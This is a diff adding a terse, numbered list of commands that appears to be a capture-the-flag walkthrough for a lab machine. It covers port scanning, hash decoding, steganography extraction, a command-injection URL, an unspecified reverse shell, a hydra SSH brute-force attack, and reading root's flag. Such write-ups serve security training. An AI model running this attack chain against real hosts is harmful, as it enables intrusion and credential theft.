@@ -1,0 +1,16 @@
+1 - nmap -A 10.10.239.54
+2 - view-source:http://10.10.239.54:22/
+3 - echo hash | base64 -d
+4 - wget http://10.10.239.54:22/assets/header.jpg
+5 - steghide extract -sf header.jpg
+6 - view-source:http://10.10.239.54:22/recovery.php
+7 - echo hash | base32 -d | xxd -r -p -> ROT13
+8 - view-source:http://10.10.239.54:22/nnxhweOV/index.php?cmd=whoami
+9 - REVERSE SHELL
+10 - whoami
+11 - cat /home/jacks_password_list
+12 - hydra -l jack -P jackpass.txt -s 80 10.10.239.54 ssh
+13 - ssh -p 80 jack@10.10.239.54
+14 - cp user.jpg /var/www/html
+15  - sudo -l
+16 - strings /root/root.txt
